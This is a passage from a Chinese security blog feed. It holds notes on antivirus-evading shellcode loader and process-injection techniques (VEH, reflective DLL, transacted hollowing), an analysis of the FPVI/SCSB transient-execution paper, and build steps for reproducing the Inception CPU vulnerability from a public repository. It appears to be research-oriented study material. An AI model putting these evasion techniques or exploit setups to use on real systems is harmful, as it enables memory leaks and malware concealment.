来「隐藏」恶意代码加载的技术：</p><ul><li>在执行时<strong>故意制造异常</strong>（比如非法内存访问）</li><li>注册一个自定义的 SEH 异常处理函数</li><li>异常发生后，控制流就会<strong>自动转到异常处理函数</strong> → 在处理函数里执行恶意 payload（比如 shellcode）</li></ul><h1 id="8-VEH-Loader"><a href="#8-VEH-Loader" class="headerlink" title="8. VEH Loader"></a>8. VEH Loader</h1><p>先放几篇文章吧，这个技术貌似正盛啊</p><ol><li><a href="https://www.freebuf.com/articles/web/422826.html">https://www.freebuf.com/articles/web/422826.html</a></li><li><a href="https://github.com/patrickt2017/VEHNetLoader/tree/main">https://github.com/patrickt2017/VEHNetLoader/tree/main</a></li><li><a href="https://github.com/Ymjie/ShellStepVEH/tree/main">https://github.com/Ymjie/ShellStepVEH/tree/main</a></li><li><a href="https://www.xiasec.com/437.html">https://www.xiasec.com/437.html</a></li></ol><p>VEH 全称：<strong>向量化异常处理(Vectored Exception Handling)</strong></p><ul><li>是 Windows XP+ 引入的一种全局异常机制</li><li>通过 <code>AddVectoredExceptionHandler</code> 注册</li><li>系统在发生异常时，会首先调用 <strong>VEH</strong> → 然后才是 SEH</li></ul><p>特点：</p><ul><li>VEH 是进程级别，全局有效（不依赖具体线程或局部 <code>__try/__except</code> 块）</li><li>可以更早地拦截异常</li><li>注册简单，只需一次调用，不影响正常流程</li></ul><h1 id="9-Reflective-DLL-Injection"><a href="#9-Reflective-DLL-Injection" class="headerlink" title="9. Reflective DLL Injection"></a>9. Reflective DLL Injection</h1><p>参考链接：<a href="https://l1pmoluy.github.io/2025/03/26/DLL%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5blog%E7%AE%80%E6%B4%81%E7%89%88/">https://l1pmoluy.github.io/2025/03/26/DLL%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5blog%E7%AE%80%E6%B4%81%E7%89%88/</a></p><p>我们的目的是为了学习了解反射 dll，虽然说这位师傅已经说是 dll 反射注入的简洁版，但是我觉得，还是不够简洁，我再优化一下，方便各位师傅，学习 dll 反射注入的使用方法和思路；</p><p><strong>什么是Reflective DLL Injection？</strong></p><p>正常 DLL 注入：</p><ul><li>调用 <code>LoadLibrary</code> 或 <code>LdrLoadDll</code> → 系统加载 DLL → 调用 DllMain</li><li>系统自动完成：分配内存、解析导入表、重定位、TLS 初始化等</li></ul><p>Reflective DLL Injection：</p><ul><li><p>自己在 dll 中写一个导出的 loader 函数（通常叫 ReflectiveLoader）</p></li><li><p>把 DLL 自己（包括 ReflectiveLoader）整体写入目标进程内存</p></li><li><p>在目标进程里，执行 ReflectiveLoader：</p></li><li><p>自己做：重定位、解析导入表、调用入口点（DllMain）</p></li><li><p>不调用 <code>LoadLibrary</code>&#x2F;<code>LdrLoadDll</code></p></li></ul><h1 id="10-Process-Hollowing"><a href="#10-Process-Hollowing" class="headerlink" title="10. Process Hollowing"></a>10. Process Hollowing</h1><p>后面的不太想写了，好累啊</p><h1 id="11-Early-Bird-APC"><a href="#11-Early-Bird-APC" class="headerlink" title="11. Early Bird APC"></a>11. Early Bird APC</h1><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1752591063469-a5b4e7d7-9da7-49e0-9903-14bfb2e4fdd5.png" alt="img"></p><h1 id="12-Transacted-Hollowing"><a href="#12-Transacted-Hollowing" class="headerlink" title="12. Transacted Hollowing"></a>12. Transacted Hollowing</h1><p>参考内容：</p><ol><li><a href="https://www.y0ng.top/2024/09/03/Process-Injection2/">https://www.y0ng.top/2024/09/03/Process-Injection2/</a></li><li><a href="https://github.com/hasherezade/transacted_hollowing">https://github.com/hasherezade/transacted_hollowing</a></li></ol><p>Transacted Hollowing（事务性进程悬空&#x2F;挂马）是一种Windows下的进程注入技术，常用于免杀和绕过安全检测。其核心原理是利用NTFS的事务特性，在未落盘的情况下将恶意代码注入到目标进程，实现代码执行且难以被查杀。</p><ol><li>创建一个NTFS事务。</li><li>在事务中创建一个临时可执行文件（未真正写入磁盘）。</li><li>读取恶意PE。</li><li>创建挂起进程（如notepad.exe）。</li><li>用恶意PE替换挂起进程的内存映像。</li><li>恢复进程运行，实现“挂马”。</li></ol><h1 id="13-Process-Doppelganging"><a href="#13-Process-Doppelganging" class="headerlink" title="13. Process Doppelganging"></a>13. Process Doppelganging</h1><p><a href="https://github.com/hasherezade/process_doppelganging">https://github.com/hasherezade/process_doppelganging</a></p><h1 id="14-Herpaderping"><a href="#14-Herpaderping" class="headerlink" title="14. Herpaderping"></a>14. Herpaderping</h1><p><a href="https://github.com/jxy-s/herpaderping">https://github.com/jxy-s/herpaderping</a></p><h1 id="15-AtomBombing"><a href="#15-AtomBombing" class="headerlink" title="15. AtomBombing"></a>15. AtomBombing</h1><p><a href="https://github.com/BreakingMalwareResearch/atom-bombing">https://github.com/BreakingMalwareResearch/atom-bombing</a></p><h1 id="16-Thread-Hijacking"><a href="#16-Thread-Hijacking" class="headerlink" title="16. Thread Hijacking"></a>16. Thread Hijacking</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://idiotc4t.com/">https://idiotc4t.com/</a></li><li><a href="https://cloud.tencent.com/developer/article/2483719">https://cloud.tencent.com/developer/article/2483719</a></li><li><a href="https://shut-td.github.io/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/">https://shut-td.github.io/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/</a></li><li><a href="https://l1pmoluy.github.io/2025/03/26/DLL%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5blog%E7%AE%80%E6%B4%81%E7%89%88/">https://l1pmoluy.github.io/2025/03/26/DLL%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5blog%E7%AE%80%E6%B4%81%E7%89%88/</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>免杀对抗</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀对抗</tag>
      
      <tag>Loader</tag>
      
      <tag>加载器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(论文解析)FPVI+SCSB漏洞论文解析</title>
    <link href="/2025/07/18/(%E8%AE%BA%E6%96%87%E8%A7%A3%E6%9E%90)FPVI-SCSB%E6%BC%8F%E6%B4%9E%E8%AE%BA%E6%96%87%E8%A7%A3%E6%9E%90/"/>
    <url>/2025/07/18/(%E8%AE%BA%E6%96%87%E8%A7%A3%E6%9E%90)FPVI-SCSB%E6%BC%8F%E6%B4%9E%E8%AE%BA%E6%96%87%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="论文核心内容"><a href="#论文核心内容" class="headerlink" title="论文核心内容"></a>论文核心内容</h2><p>这篇论文的核心贡献在于，它将研究视角从基于已知瞬态执行窗口（如分支预测错误）开发新攻击，转向了深入探索瞬态执行本身的根源 。论文系统性地研究了“机器清除”这一大类此前未被充分探索的“错误推测”（Bad Speculation）事件 。</p><p>通过逆向工程，论文详细分析了四种未曾被深入研究的机器清除原因：</p><ol><li><strong>浮点（Floating Point, FP）机器清除</strong></li><li><strong>自修改代码（Self-Modifying Code, SMC）机器清除</strong></li><li><strong>内存排序（Memory Ordering, MO）机器清除</strong></li><li><strong>内存消歧（Memory Disambiguation, MD）机器清除</strong></li></ol><p>研究发现，这些机器清除不仅为已知攻击提供了新的瞬态执行窗口，还催生了两种全新的攻击原语：</p><p><strong>浮点值注入（Floating Point Value Injection, FPVI）</strong>和 <strong>推测性代码存储绕过（Speculative Code Store Bypass, SCSB）</strong>。论文最终成功在最新版的 Mozilla Firefox 浏览器上实现了一个端到端的 FPVI 攻击，并提出了相应的缓解措施和新的瞬态执行分类方法 。</p><p>以下是这四种机器清除的详细成因与利用原理：</p><h3 id="1-自修改代码-Self-Modifying-Code-SMC-机器清除"><a href="#1-自修改代码-Self-Modifying-Code-SMC-机器清除" class="headerlink" title="1. 自修改代码 (Self-Modifying Code, SMC) 机器清除"></a>1. 自修改代码 (Self-Modifying Code, SMC) 机器清除</h3><ul><li><p><strong>成因 (Why it happens):</strong></p><ul><li>现代 CPU 拥有独立的指令缓存（L1i）和数据缓存（L1d），并通过缓存一致性协议来保证代码和数据视图的统一 。</li><li>当一个“存储”指令修改了一块代码区域，而这块代码恰好已经被 CPU 的指令预取单元（IFU）加载到了指令缓存（L1i）或执行流水线中时，就会产生冲突 。</li><li>此时，CPU 的数据视图（即通过数据缓存写入的新代码）和指令视图（即在指令缓存中的陈旧代码）出现了短暂的<strong>不同步</strong>。</li><li>为了纠正这种不同步并确保执行的是最新的代码，CPU 必须触发一次 SMC 机器清除，以冲刷整个流水线和指令缓存中的陈旧指令，然后重新获取新指令 。</li></ul></li><li><p><strong>利用原理 (How it’s exploited):</strong></p><ul><li>利用的关键在于从“写入新代码”到“CPU 检测到不同步并执行清除”之间存在一个<strong>时间延迟</strong>。</li><li>在这个短暂的延迟窗口中，CPU 会继续<strong>瞬态地执行</strong>已经在流水线中的<strong>陈旧代码</strong>（Stale Code）。</li><li>攻击者可以利用这一点，先让一段恶意代码（Gadget）存在于某块内存中，然后通过 JIT 引擎等方式让系统在这块内存上写入新的、无害的代码。在 SMC 机器清除发生前，那段陈旧的恶意代码会被瞬态执行，其产生的微架构副作用（如改变缓存状态）可被用于泄露信息 。这被称为**推测性代码存储绕过 (SCSB)**。</li></ul></li></ul><h3 id="2-浮点-Floating-Point-FP-机器清除"><a href="#2-浮点-Floating-Point-FP-机器清除" class="headerlink" title="2. 浮点 (Floating Point, FP) 机器清除"></a>2. 浮点 (Floating Point, FP) 机器清除</h3><ul><li><p><strong>成因 (Why it happens):</strong></p><ul><li>当浮点运算单元（FPU）遇到它无法直接在硬件中高效处理的操作时，例如对<strong>非规格化浮点数（Denormal Numbers）</strong> 的运算，它需要特殊的软件辅助来完成 。</li><li>这种特殊处理是通过<strong>微码辅助 (Microcode Assist)</strong> 实现的 。</li><li>在执行微码辅助程序之前，CPU 必须清空当前的执行流水线，而这个清空操作就是通过一次机器清除完成的 。因此，任何需要微码辅助的浮点操作都会引发一次 FP 机器清除 。</li></ul></li><li><p><strong>利用原理 (How it’s exploited):</strong></p><ul><li>利用的关键在于 FPU 在请求微码辅助<strong>之前</strong>的行为。</li><li>研究发现，FPU 会首先“盲目地”假设操作数都是正常的，并快速计算出一个<strong>瞬态的、错误的结果</strong>。</li><li>CPU 会在稍后才检测到这个计算是错误的（因为它涉及非规格化数），并触发机器清除来纠正它。这个检测延迟创造了一个瞬态执行窗口 。</li><li>在这个窗口期内，后续指令会使用那个错误的瞬态结果进行运算 。攻击者可以通过精心构造浮点操作的输入，使得这个错误的瞬态结果变成一个可控的、有特定位模式的值（例如一个指针），从而在瞬态执行路径上实现任意值注入，这被称为**浮点值注入 (FPVI)**。</li></ul></li></ul><h3 id="3-内存排序-Memory-Ordering-MO-机器清除"><a href="#3-内存排序-Memory-Ordering-MO-机器清除" class="headerlink" title="3. 内存排序 (Memory Ordering, MO) 机器清除"></a>3. 内存排序 (Memory Ordering, MO) 机器清除</h3><ul><li><p><strong>成因 (Why it happens):</strong></p><ul><li>现代多核 CPU 为了隐藏内存延迟，允许乱序执行（Out-of-Order Execution），但这必须遵守特定的内存排序模型（如 Intel 的 TSO 模型）以保证程序行为的正确性 。</li><li>当一个核心（核心 A）正在乱序执行内存操作时（例如，一个快的加载操作先于一个慢的加载操作执行），如果此时它收到了来自另一个核心（核心 B）的**窥探请求 (snoop request)**，表明某个内存地址的数据已被修改，这可能导致核心 A 的执行顺序违反内存排序模型 。</li><li>例如，如果核心 A 瞬态地看到了 Y 的新值，但看到的却是 X 的旧值，这在 TSO 模型中可能是一个非法状态 。</li><li>为了维持内存排序的正确性，核心 A 别无选择，只能触发一次 MO 机器清除，冲刷流水线并按正确的顺序重新执行加载操作 。</li></ul></li><li><p><strong>利用原理 (How it’s exploited):</strong></p><ul><li>利用点在于，在内存排序冲突被检测到并被机器清除纠正<strong>之前</strong>，CPU 已经基于一个<strong>陈旧的内存值</strong>进行了瞬态执行 。</li><li>在上述例子中，核心 A 上的指令会基于从 Y 读取到的陈旧值（在核心 B 写入之前的值）继续瞬态执行。</li><li>攻击者可以通过在两个线程间制造内存竞争，让一个线程（攻击线程）的写操作去“污染”另一个线程（受害线程）即将读取的缓存行，从而在受害线程中触发一个基于陈旧数据的瞬态执行路径 。</li></ul></li></ul><h3 id="4-内存消歧-Memory-Disambiguation-MD-机器清除"><a href="#4-内存消歧-Memory-Disambiguation-MD-机器清除" class="headerlink" title="4. 内存消歧 (Memory Disambiguation, MD) 机器清除"></a>4. 内存消歧 (Memory Disambiguation, MD) 机器清除</h3><ul><li><p><strong>成因 (Why it happens):</strong></p><ul><li>为了优化性能，CPU 包含一个<strong>内存消歧预测器</strong>，用于预测一个加载（Load）操作是否与它前面的、地址尚未计算出来的存储（Store）操作访问相同的内存地址（即别名 Aliasing）。</li><li>如果预测器预测“无别名”，CPU 就会乐观地将该加载操作提前执行（称为“提升” Hoisting）。</li><li>当这个预测<strong>错误</strong>时（即预测无别名，但实际上有别名），就会触发一次 MD 机器清除 。</li><li>清除是必要的，因为提前执行的加载操作从内存中读取了一个<strong>陈旧的值</strong>（因为真正应该提供数据的那个存储操作还没来得及写入），CPU 必须撤销这个错误操作并重新正确地执行加载 。</li></ul></li><li><p><strong>利用原理 (How it’s exploited):</strong></p><ul><li>利用原理非常直接：当预测器被诱导发生错误时，被提升的加载操作会瞬态地读取到一个<strong>陈旧的数据值</strong>。</li><li>这个陈旧的值会被传递给后续的指令，在瞬态执行路径上使用，从而可以被用来泄露信息 。</li><li>攻击者需要做的就是通过一系列特定的内存访问模式来“训练”或“误导”内存消歧预测器，使其在关键时刻做出错误的“无别名”预测 。这正是<strong>Spectre Variant 4 (Speculative Store Bypass, SSB)</strong> 攻击的核心机制 。</li></ul></li></ul><h2 id="威胁模型-Threat-Model"><a href="#威胁模型-Threat-Model" class="headerlink" title="威胁模型 (Threat Model)"></a>威胁模型 (Threat Model)</h2><p>论文设定的威胁模型如下：</p><ul><li><strong>攻击者能力</strong>：攻击者是无特权的，可以在受害者机器上运行代码，例如通过 JavaScript、普通用户进程或虚拟机 。</li><li><strong>攻击目标</strong>：目标是跨越安全边界（如从用户空间到内核，或从一个进程到另一个进程）泄露机密信息，如私钥、密码或随机化指针 。</li><li><strong>受害者环境</strong>：受害者是一台基于 x86-64 架构的机器，运行着最新的操作系统和 CPU 微码，并且已经部署了所有针对瞬态执行攻击的最新缓解措施 。</li></ul><h2 id="漏洞成因-Cause-of-Vulnerabilities"><a href="#漏洞成因-Cause-of-Vulnerabilities" class="headerlink" title="漏洞成因 (Cause of Vulnerabilities)"></a>漏洞成因 (Cause of Vulnerabilities)</h2><p>漏洞的根本原因在于 CPU 为了提升性能而进行的“错误推测”，当这些推测被发现错误时，CPU 会执行“机器清除”来冲刷整个处理器流水线 。这个过程会产生一个时间窗口，其中错误推测路径上执行的指令虽然最终会被丢弃，但其产生的微架构层面的副作用（如缓存状态变化）却可能保留下来，从而被攻击者利用。</p><p>具体来说，两种新攻击原语的成因如下：</p><ol><li><p><strong>SCSB 的成因（基于 SMC 机器清除）</strong>:</p><ul><li><p>在现代 CPU 架构中，为了性能，指令缓存（L1i）和数据缓存（L1d）是分离的，但缓存一致性协议会确保二者同步 。</p></li><li><p>当一个“存储”指令修改了一块正在被执行或即将被取指的代码区域时（即自修改代码），就会发生 SMC 。</p></li><li><p>这会导致 CPU 的数据视图（新写入的代码）和指令视图（已在流水线或 L1i 缓存中的旧代码）之间出现短暂的<strong>不同步</strong>。</p></li><li><p>在 CPU 检测到这种不同步并触发 SMC 机器清除以刷新流水线之前，它会瞬态地执行<strong>陈旧的（stale）代码</strong>。攻击者可以利用这个窗口执行恶意的旧代码片段。</p></li></ul></li><li><p><strong>FPVI 的成因（基于 FP 机器清除）</strong>:</p><ul><li><p>当浮点运算单元（FPU）处理非规格化浮点数（denormal numbers）时，硬件无法直接处理，需要借助微码辅助（microcode assist）来完成 。</p></li><li><p>调用微码辅助前，CPU 必须触发一次机器清除来清空流水线 。</p></li><li><p>在触发机器清除之前，FPU 会“盲目地”按照处理正常数值的方式进行计算，从而产生一个<strong>瞬态的、错误的计算结果</strong>。</p></li><li><p>这个错误的瞬态结果会被后续指令使用，直到 CPU 检测到错误并纠正它 。攻击者可以通过精心构造非规格化浮点数，来“注入”一个任意的、可控的瞬态值。</p></li></ul></li></ol><h2 id="攻击原语-Attack-Primitives"><a href="#攻击原语-Attack-Primitives" class="headerlink" title="攻击原语 (Attack Primitives)"></a>攻击原语 (Attack Primitives)</h2><p>基于上述成因，论文提出了两种新的攻击原语：</p><ol><li><p><strong>Speculative Code Store Bypass (SCSB) - 推测性代码存储绕过</strong>:</p><ul><li><p>此原语利用 SMC 机器清除，允许攻击者在瞬态执行窗口中执行一段<strong>陈旧且受控的代码</strong>。</p></li><li><p>它类似于对 JIT（Just-In-Time）代码缓存的瞬态“释放后使用”（Use-After-Free）攻击 。</p></li><li><p>主要应用场景是 JIT 引擎（如 JavaScript 引擎），攻击者可以控制 JIT 编译过程，将恶意小工具（gadget）写入一块内存，然后让 JIT 引擎在这块内存上生成新代码，从而触发对旧有恶意小工具的瞬态执行 。</p></li></ul></li><li><p><strong>Floating Point Value Injection (FPVI) - 浮点值注入</strong>:</p><ul><li><p>此原语利用 FP 机器清除，允许攻击者将一个<strong>任意值注入</strong>到受害者的瞬态执行路径中 。</p></li><li><p>攻击者通过向受害者应用中的浮点运算提供特制的非规格化操作数来实现 。</p></li><li><p>这与 LVI（Load Value Injection）攻击类似，但 FPVI 是通过控制浮点运算的操作数，而不是通过诱导错误的加载操作来实现价值注入 。</p></li></ul></li></ol><h2 id="攻击链-Attack-Chain"><a href="#攻击链-Attack-Chain" class="headerlink" title="攻击链 (Attack Chain)"></a>攻击链 (Attack Chain)</h2><h3 id="1-推测性代码存储绕过-SCSB-的攻击链"><a href="#1-推测性代码存储绕过-SCSB-的攻击链" class="headerlink" title="1. 推测性代码存储绕过 (SCSB) 的攻击链"></a>1. 推测性代码存储绕过 (SCSB) 的攻击链</h3><p>SCSB 攻击的核心是利用自修改代码（SMC）机器清除前的延迟，在瞬态执行窗口中执行一段陈旧且受控的代码 。其攻击链主要针对 JIT (Just-In-Time) 引擎，如浏览器中的 JavaScript 引擎 。</p><p>攻击步骤如下：</p><ol><li><p><strong>控制代码缓存 (Code Cache Manipulation)</strong></p><ul><li><p>攻击者首先需要操纵 JIT 引擎的代码缓存分配器 。</p></li><li><p>通过特定的操作（类似堆喷射），攻击者让一段包含恶意泄密小工具（gadget）的陈旧代码 <code>g</code> 存在于 JIT 代码缓存的某个特定、可预测的内存区域，这块区域随后被“释放” 。</p></li></ul></li><li><p><strong>触发代码写入与执行 (Triggering Code Write &amp; Execution)</strong></p><ul><li><p>攻击者接着强制 JIT 引擎编译一段新的、无害的代码 <code>f</code>，并让引擎将这段新代码写入到刚才被控制的同一块内存区域 。</p></li><li><p>紧接着，JIT 引擎会立即跳转到这块内存区域，准备执行新代码 <code>f</code>。</p></li></ul></li><li><p><strong>瞬态执行陈旧代码 (Transient Execution of Stale Code)</strong></p><ul><li><p>这是攻击的关键。由于 CPU 的数据视图（刚写入的新代码 <code>f</code>）和指令视图（已在预取队列或指令缓存中的陈旧代码 <code>g</code>）之间存在短暂的不同步，CPU 不会立即执行新代码 <code>f</code>。</p></li><li><p>相反，CPU 会<strong>瞬态地执行</strong>那段陈旧的、由攻击者植入的恶意小工具代码 <code>g</code>，直到 SMC 机器清除被触发来纠正这个不同步 。</p></li></ul></li><li><p><strong>泄露秘密与恢复 (Leakage and Recovery)</strong></p><ul><li><p>被瞬态执行的恶意小工具 <code>g</code> 会执行一个可以泄露秘密的操作，例如，根据某个秘密值去访问特定的缓存行，从而在缓存中留下痕迹 。</p></li><li><p>之后，SMC 机器清除发生，流水线被冲刷，CPU 的代码和数据视图恢复同步 。</p></li><li><p>最终，CPU 开始从架构上正确地执行新的无害代码 <code>f</code>。但此时，秘密信息已经通过微架构状态（缓存）的变化被泄露，攻击者可以通过侧信道（如 FLUSH+RELOAD）检测到这个变化来获取秘密。</p></li></ul></li></ol><h3 id="2-浮点值注入-FPVI-的攻击链"><a href="#2-浮点值注入-FPVI-的攻击链" class="headerlink" title="2. 浮点值注入 (FPVI) 的攻击链"></a>2. 浮点值注入 (FPVI) 的攻击链</h3><p>FPVI 攻击允许攻击者通过浮点运算，将一个任意值注入到瞬态执行路径中 。论文中展示了一个针对 <strong>Mozilla Firefox 浏览器 SpiderMonkey 引擎</strong>的完整攻击链，该攻击利用了其 <strong>NaN-boxing</strong> 实现 。</p><p>攻击步骤如下：</p><ol><li><p><strong>构造输入操作数 (Crafting Input Operands)</strong></p><ul><li><p>攻击者在 JavaScript 沙箱中，执行一个浮点运算（例如除法）。</p></li><li><p>攻击者为这个运算提供了两个经过精心构造的<strong>非规格化浮点数（denormal numbers）</strong> 作为操作数 。</p></li></ul></li><li><p><strong>注入瞬态值 (Injecting the Transient Value)</strong></p><ul><li><p>当 FPU 处理这些非规格化数时，它会首先“盲目地”按正常流程计算，从而瞬态地产生一个<strong>错误的、但可被攻击者预测和控制的结果</strong><code>z</code>。</p></li><li><p>攻击者构造的操作数，会使这个瞬态结果 <code>z</code> 的二进制位模式恰好符合 SpiderMonkey 的 NaN-boxing 编码：高位部分是一个<strong>“字符串”类型的标签</strong>，而低位部分（payload）则是<strong>攻击者想要读取的任意内存地址</strong>。</p></li></ul></li><li><p><strong>瞬态类型混淆 (Transient Type Confusion)</strong></p><ul><li><p>在瞬态执行路径上，JIT 编译后的代码会检查运算结果 <code>z</code> 的类型。它会读取到伪造的“字符串”标签，并错误地认为 <code>z</code> 是一个合法的字符串对象指针 。</p></li><li><p>然而，在架构上，这次运算的正确结果是一个浮点数（例如 <code>-Infinity</code>），因此这个代码分支在正常情况下永远不会被执行 。这就造成了一次**推测性类型混淆 (speculative type confusion)**。</p></li></ul></li><li><p><strong>瞬态内存读取与泄露 (Transient Memory Read and Leakage)</strong></p><ul><li><p>接着，瞬态执行的代码会尝试访问这个伪造“字符串”对象的属性，例如 <code>z.length</code>。</p></li><li><p>这次访问在微架构层面变成了一次对<strong>攻击者注入的任意地址</strong>的内存读取操作 。</p></li><li><p>从该地址读取到的秘密数据，会被用来访问一个共享缓存区，通过 <code>EVICT+RELOAD</code> 等侧信道技术将秘密泄露出来 。</p></li></ul></li><li><p><strong>恢复与清理 (Recovery and Cleanup)</strong></p><ul><li><p>CPU 最终检测到最初的浮点运算存在错误（因涉及非规格化数），触发 FP 机器清除，冲刷流水线 。</p></li><li><p>然后，CPU 以正确的、架构上的结果重新执行代码 。但此时，秘密信息已经通过瞬态执行期间留下的缓存痕迹成功泄露 。</p></li></ul></li></ol><h2 id="复现环境-Reproduction-Environment"><a href="#复现环境-Reproduction-Environment" class="headerlink" title="复现环境 (Reproduction Environment)"></a>复现环境 (Reproduction Environment)</h2><ul><li><p><strong>FPVI 端到端攻击的复现环境</strong>:</p><ul><li><strong>CPU</strong>: Intel Core i9-9900K (微码版本 0xde) 。</li><li><strong>操作系统</strong>: Linux 5.8.0 。</li><li><strong>软件</strong>: Firefox 85.0 。</li><li><strong>配置</strong>：为了简化侧信道攻击，实验中在 Firefox 中启用了高精度计时器 。</li></ul></li><li><p><strong>受影响的处理器范围</strong>：</p><ul><li>论文在多个 Intel 和 AMD 处理器上测试并验证了漏洞的存在 。</li><li><strong>SCSB</strong>：所有测试的 Intel 和 AMD 处理器均受影响 。ARM 架构由于其规范要求在自修改代码后使用显式的软件屏障，因此不受影响 。</li><li><strong>FPVI</strong>：所有测试的 Intel 和 AMD 处理器均受影响 。尽管在 AMD 上没有找到可利用的 NaN-boxing 瞬态结果，但漏洞本身存在 。在 ARM 上未观察到瞬态结果的痕迹 。</li><li><strong>测试过的处理器型号包括</strong>：<ul><li>Intel: Core i7-10700K, Xeon Silver 4214, Core i9-9900K, Core i7-7700K 。</li><li>AMD: Ryzen 5 5600X, Ryzen Threadripper 2990WX, Ryzen 7 2700X 。</li><li>ARM: Cortex-A72 (Broadcom BCM2711) 。</li></ul></li></ul></li></ul><h2 id="攻击效果-Implementation-Effect"><a href="#攻击效果-Implementation-Effect" class="headerlink" title="攻击效果 (Implementation Effect)"></a>攻击效果 (Implementation Effect)</h2><ul><li><p><strong>FPVI 攻击效果</strong>：在 Firefox 上的端到端攻击，成功实现了从浏览器进程中读取任意内存 。</p><ul><li><strong>泄露速率</strong>：约 13 KB&#x2F;s 。</li><li><strong>瞬态窗口大小</strong>：通过增加 FPU 的计算压力，瞬态窗口可以扩展到约 12 条加载指令 。</li></ul></li><li><p><strong>各机制性能对比</strong>：</p><ul><li><strong>泄露效率</strong>：FP 机器清除被证明是一种高效的瞬态执行触发机制，其泄露率可与已被广泛研究但常被禁用的 TSX 相媲美，并且在 Intel 和 AMD 平台上都可用 。</li><li><strong>适用性</strong>：与需要复杂“训练”的分支预测和内存消歧不同，许多机器清除（如 FP、SMC）无需训练，这使得攻击更高效，且能绕过基于模式检测的防御措施 。</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>科研工作</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CPU</tag>
      
      <tag>处理器漏洞</tag>
      
      <tag>论文解析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(CVE-2023-20569)Inception漏洞复现</title>
    <link href="/2025/07/17/CVE-2023-20569-Inception%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/07/17/CVE-2023-20569-Inception%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>内容来源：</p><ol><li><a href="https://www.usenix.org/conference/usenixsecurity23/presentation/trujillo">https://www.usenix.org/conference/usenixsecurity23/presentation/trujillo</a></li><li><a href="https://comsec.ethz.ch/research/microarch/inception/">https://comsec.ethz.ch/research/microarch/inception/</a></li><li><a href="https://github.com/comsec-group/inception">https://github.com/comsec-group/inception</a></li></ol></blockquote><h1 id="1-复现环境"><a href="#1-复现环境" class="headerlink" title="1 复现环境"></a>1 复现环境</h1><ul><li>CPU：AMD EPYC 7252 8-Core Processor（使用的是 zen2 的 CPU，因此复现的是 zen1 或 zen2 的部分）</li><li>Microcode：0x8301072</li><li>Linux Kernel：5.19.0-28-generic</li></ul><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1752762548493-2a740cda-946d-4f87-b2d8-be6134d192ef.png" alt="img"></p><h1 id="2-环境配置"><a href="#2-环境配置" class="headerlink" title="2 环境配置"></a>2 环境配置</h1><p>linux 内核版本具有限制，如果为非<code>5.19.0-28-generic</code>的 linux 内核无法成功复现实验。</p><p>原因是由于代码中部分 gadget 采用的是硬编码的形式，在其他版本的 linux 内核中 gadget 偏移不一致或不存在相关的 gadget。</p><p>作者提供的 linux 内核下载链接：<a href="https://jknr.me/filez/ubuntu-5.19.0-28-generic.tar.gz">https://jknr.me/filez/ubuntu-5.19.0-28-generic.tar.gz</a></p><p>以下是切换内核的相应方法；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -zxvf ubuntu-5.19.0-28-generic.tar.gz<br><span class="hljs-built_in">cd</span> ubuntu-5.19.0-28-generic<br>sudo <span class="hljs-built_in">cp</span> vmlinuz-5.19.0-28-generic /boot/<br>sudo <span class="hljs-built_in">cp</span> initrd.img-5.19.0-28-generic /boot/<br>sudo <span class="hljs-built_in">cp</span> System.map-5.19.0-28-generic /boot/<br>sudo <span class="hljs-built_in">cp</span> config-5.19.0-28-generic /boot/<br>sudo vim /etc/default/grub<br><span class="hljs-comment"># GRUB_DEFAULT=&quot;1&gt;4&quot;(不一定一样,先采用下面的方法，不行在查该方式的配置方法)</span><br><span class="hljs-comment"># GRUB_DEFAULT=&quot;Advanced options for Ubuntu&gt;Ubuntu, with Linux 5.19.0-28-generic&quot;</span><br>sudo update-grub<br>sudo reboot<br><span class="hljs-built_in">uname</span> -r<br>sudo <span class="hljs-built_in">ln</span> -sf &lt;ubuntu-5.19.0-28-generic full path&gt;/usr/src/linux-headers-5.19.0-28-generic /lib/modules/5.19.0-28-generic/build<br></code></pre></td></tr></table></figure><h1 id="3-复现步骤"><a href="#3-复现步骤" class="headerlink" title="3 复现步骤"></a>3 复现步骤</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/comsec-group/inception.git<br>sudo apt install clang gcc-12<br><span class="hljs-built_in">export</span> CC=gcc-12<br><span class="hljs-built_in">cd</span> inception/inception/zen_1_2<br>clang -DZEN2 -DCORE1=1 -DCORE2=9 inception.c -o inception<br>clang -DSET=33 workload.c -o workload<br><span class="hljs-built_in">cd</span> ../kmod<br>make install<br>sudo dmesg | <span class="hljs-built_in">tail</span> -n 10<span 